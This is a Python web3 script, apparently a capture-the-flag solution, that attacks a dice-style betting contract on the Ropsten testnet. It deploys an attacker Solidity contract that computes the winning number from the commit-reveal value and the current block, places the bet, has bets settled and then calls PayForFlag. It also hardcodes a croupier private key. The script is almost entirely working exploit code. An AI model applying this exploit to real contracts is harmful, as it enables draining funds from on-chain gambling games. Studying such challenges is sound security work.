from web3 import Web3
from solc import compile_source
import os, random

infura_url = 'https://ropsten.infura.io/v3/xxx'
web3 = Web3(Web3.HTTPProvider(infura_url))
accounts = {
    'player': {
        'addr': '0x8F1D24E114aA84bC66d8950142008348b4c6cEd0',
        'priv': ''
    }, 
    'croupier': {
        'addr': '0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C',
        'priv': '6F08D741943990742381E1223446553A63B38A3AA86BEEF1E9FC5FCF61E66D12'
    }
}


def sign(reveal):
    result = {'reveal':reveal}
    
    commitLastBlock = web3.eth.blockNumber + 250
    result['commitLastBlock'] = commitLastBlock
    
    commit = web3.sha3( reveal.to_bytes(32, 'big') )
    result['commit'] = int.from_bytes(commit, 'big')
    
    message = commitLastBlock.to_bytes(5, 'big') + commit
    message_hash = web3.sha3(message)
    signature = web3.eth.account.signHash(message_hash, private_key=accounts['croupier']['priv'])
    result['r'] = signature['r']
    result['s'] = signature['s']
    result['v'] = signature['v']
    
    return result


def transact(_to, _data):
    tx = {
        'from': defaultAccount['addr'],
        'nonce': web3.eth.getTransactionCount(defaultAccount['addr']),
        'to': _to,
        'gas': 1000000,
        'value': 0,
        'gasPrice': web3.eth.gasPrice * 2,
        'data': _data,
    }
    signed_tx = web3.eth.account.signTransaction(tx, defaultAccount['priv'])
    tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
    tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)
    return tx_receipt


def settleBet():
    transact( gameAddress, web3.sha3(b'settleBet(uint256)')[:4].hex() + hex(reveal)[2:].rjust(64, '0') )


def getFlag():
    transact( attackAddress, web3.sha3(b'getFlag()')[:4].hex() )


attack = '''pragma solidity ^0.4.24;
contract Attack {
    address constant croupier = 0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C;
    uint8 constant modulo = 100;
    uint40 constant wager = 1000;
    uint8 betnumber;
    address game;

    constructor(address _game, uint40 commitLastBlock, uint commit, bytes32 r, bytes32 s, uint8 v, uint reveal) public {
        game = _game;
        bytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock, commit));
        require (croupier == ecrecover(signatureHash, v, r, s), "signature is not valid.");
        require (commit == uint(keccak256(abi.encodePacked(reveal))), "commit is not valid.");

        bytes32 entropy = keccak256(abi.encodePacked(reveal, uint(block.number)));
        uint _betnumber = uint(entropy) % uint(modulo);
        betnumber = uint8(_betnumber);

        game.call(bytes4(keccak256("placeBet(uint8,uint8,uint40,uint40,uint256,bytes32,bytes32,uint8)")),betnumber,modulo,wager,commitLastBlock,commit,r,s,v);

    }

    function getFlag() external {
        game.call(bytes4(keccak256("PayForFlag()")));
        selfdestruct(0);
    }

}'''


defaultAccount = accounts['player']
gameAddress = ''

reveal = random.randint(1, 2**40)
result = sign(reveal)

compiled_sol = compile_source(attack)
contract_interface = compiled_sol['<stdin>:Attack']
bytecode = contract_interface['bin']
bytecode += gameAddress[2:].rjust(64, '0')
bytecode += hex( result['commitLastBlock'] )[2:].rjust(64, '0')
bytecode += hex( result['commit'] )[2:].rjust(64, '0')
bytecode += hex( result['r'] )[2:].rjust(64, '0')
bytecode += hex( result['s'] )[2:].rjust(64, '0')
bytecode += hex( result['v'] )[2:].rjust(64, '0')
bytecode += hex( result['reveal'] )[2:].rjust(64, '0')
tx = {
    'from': defaultAccount['addr'],
    'nonce': web3.eth.getTransactionCount(defaultAccount['addr']),
    'gas': 1000000,
    'value': 0,
    'gasPrice': web3.eth.gasPrice * 2,
    'data': '0x' + bytecode,
}
signed_tx = web3.eth.account.signTransaction(tx, defaultAccount['priv'])
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)
attackAddress =  tx_receipt.contractAddress
print('attack Address: ' + attackAddress)


defaultAccount = accounts['croupier']
for _ in range(3):
    settleBet()
    print('settleBet')


defaultAccount = accounts['player']
getFlag()
print('done')